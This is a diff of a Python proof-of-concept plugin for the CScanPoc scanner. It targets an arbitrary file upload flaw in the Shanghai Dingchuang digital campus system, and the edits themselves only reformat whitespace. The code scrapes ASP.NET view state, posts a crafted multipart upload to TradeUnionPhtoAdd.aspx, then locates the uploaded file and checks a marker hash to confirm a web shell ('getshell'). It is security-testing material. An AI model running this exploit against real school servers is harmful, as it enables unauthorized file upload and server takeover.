@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Goodo-edu_0006' # 平台漏洞编号，留空
+    vuln_id = 'Goodo-edu_0006'  # 平台漏洞编号，留空
     name = '上海鼎创通用型数字校园系统 任意上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-04-29'  # 漏洞公布时间
     desc = '''
         上海鼎创通用型数字校园系统 任意上传导致Getshell
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '上海鼎创通用型数字校园系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 def com_pack(state):
     if len(state) < 2:
@@ -61,22 +63,27 @@ Content-Type: application/octet-stream
 -----------------------------4031702637822542581177793002
 Content-Disposition: form-data; name="__EVENTVALIDATION"
 
-''' +str(state[1])+ '''
+''' + str(state[1]) + '''
 -----------------------------4031702637822542581177793002--
 '''
 
+
 def getViewState(url):
     hh = hackhttp.hackhttp()
-    code, head, res, errcode, _ = hh.http(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
+    code, head, res, errcode, _ = hh.http(
+        url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
     if code == 200:
         the_list = []
-        buff_list = re.findall('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', res)
+        buff_list = re.findall(
+            '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', res)
         if buff_list:
             the_list.append(buff_list[0])
-        buff_list = re.findall('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />', res)
+        buff_list = re.findall(
+            '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />', res)
         if buff_list:
             the_list.append(buff_list[0])
         return the_list
+
 
 class Poc(ABPoc):
     poc_id = '00e35f85-ad1c-4aff-9782-8934610887cc'
@@ -90,19 +97,20 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             # from:http://www.wooyun.org/bugs/wooyun-2015-0111072
             url = self.target
-            buff_state = getViewState(url) #get viewstat 
-            rawt = com_pack(buff_state)   #get pack
-            code, head, res, errcode, _ = hh.http(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
-            m = re.search('(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
+            buff_state = getViewState(url)  # get viewstat
+            rawt = com_pack(buff_state)  # get pack
+            code, head, res, errcode, _ = hh.http(
+                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
+            m = re.search(
+                '(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
             if m:
                 #security_info('[upload success] ' + url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -114,17 +122,21 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             url = self.target
-            buff_state = getViewState(url) #get viewstat 
-            rawt = com_pack(buff_state)   #get pack
-            code, head, res, errcode, _ = hh.http(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
-            m = re.search('(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
+            buff_state = getViewState(url)  # get viewstat
+            rawt = com_pack(buff_state)  # get pack
+            code, head, res, errcode, _ = hh.http(
+                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
+            m = re.search(
+                '(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
             if m:
-                print('[upload success] ' + url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
-                
-            code, head, res , errcode, _ = hh.http(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
+                print('[upload success] ' + url +
+                      '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
+
+            code, head, res, errcode, _ = hh.http(
+                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
             m = re.search(r"src='\.\./\.\./(.*?)'", res)
-            if m :
-                code ,head ,res, errcode,_ = hh.http(url + '/' + m.group(1))
+            if m:
+                code, head, res, errcode, _ = hh.http(url + '/' + m.group(1))
                 if 'E327B894F7C7782B9A3CE3697556902A' in res:
                     #security_hole('[getshell success] ' + url + '/' + m.group(1))
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞，getshell地址：{url}/{m}'.format(
@@ -132,6 +144,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
